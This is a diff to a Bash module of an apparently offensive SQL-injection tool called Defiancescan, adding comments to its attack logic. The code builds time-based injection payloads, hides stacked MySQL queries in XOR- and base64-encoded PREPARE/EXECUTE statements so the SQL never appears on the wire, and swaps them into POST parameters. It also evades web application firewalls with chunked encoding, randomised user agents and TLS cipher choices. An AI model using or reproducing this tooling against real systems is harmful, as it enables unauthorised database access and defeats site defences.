@@ -2,12 +2,15 @@
 # Copyright 2026 Skokoo
 # Licensed under the Apache License, Version 2.0
 
-# Sourced to Defiancescan.sh           
+# Sourced to Defiancescan.sh         
 vector_sqli_agressor_left() {
   local current_param
 current_param="${TARGET_PARAM:-id}"
   local is_raw_post
 is_raw_post=false
+
+  # Check if target is a raw query body (contains =, but no 'http/https').
+  # If true, it skips standard URL parsing and marks the attack as POST mode.
   if [[ ! "$target_url" =~ ^https?:// ]] && [[ "$target_url" == *"="* ]] && [ "${REQ_METHOD}" = "POST" ]; then
     is_raw_post=true
   fi
@@ -65,6 +68,9 @@ hex_xor=$(xor_engine "$t4")
     local b64_payload
 b64_payload=$(base64_engine "$hex_xor")
     local defiance_tamper_path
+# Inside the database, we use MySQL's PREPARE and EXECUTE statements to compile
+    # and run the decoded query directly inside the server's memory (@s).
+    # This ensures the raw SQL signature NEVER travels over the HTTP network wire.
     defiance_tamper_path="'; SET @s=FROM_BASE64('${b64_payload}'); PREPARE stmt FROM @s; EXECUTE stmt;--"
 
     local waf_args
@@ -123,6 +129,8 @@ technique_name="Generic Time-Based"
       local post_data=""
       local send_to_url=""
 
+# Replaces only the value of the targeted parameter inside the raw body
+      # with SQLi payload, while maintaining all other original params intact.
       if [ "$is_raw_post" = true ]; then
         post_data=$(echo "$target_url" | sed "s/\b${current_param}=[^&]*/${current_param}=${active_payload}/g")
         send_to_url="$clean_target_url"
@@ -136,6 +144,10 @@ payload_length=${#post_data}
       if [ "$payload_length" -gt 250 ]; then
         chunked_headers+=(-H "Transfer-Encoding: chunked")
       fi                  
+
+# "${waf_args//\"/}" strips out any literal internal double quotes to prevent
+      # malformed HTTP headers. It must be called WITHOUT surrounding double quotes
+      # to allow Bash to natively expand individual word arguments for curl.
       curl_output=$(command curl $proxy_flag $cookie_flag ${waf_args//\"/} $rapid_reset_args "${chunked_headers[@]}" \
         --tlsv1.3 --ciphers "$target_cipher" --tls13-ciphers "$target_tls13" \
         -m 12 -A "$random_ua" -s -o /dev/null -d "$post_data" \
@@ -160,6 +172,8 @@ payload_length=${#post_data}
         sleep 1
       fi
 
+# Its not important to have bc, but i suggest you to download one. It is more accurate
+# But, dont worry, if you dont have it. It will fallback to awk, what type of linux OS that doesnt support awk?
       if [[ -n "$stopwatch" && "$stopwatch" != "0" && "$stopwatch" != "0.0" && "$stopwatch" != "0.000000" ]]; then
         if command -v bc >/dev/null 2>&1; then
           is_gt=$(echo "$stopwatch >= 4.5" | bc -l 2>/dev/null || echo 0)
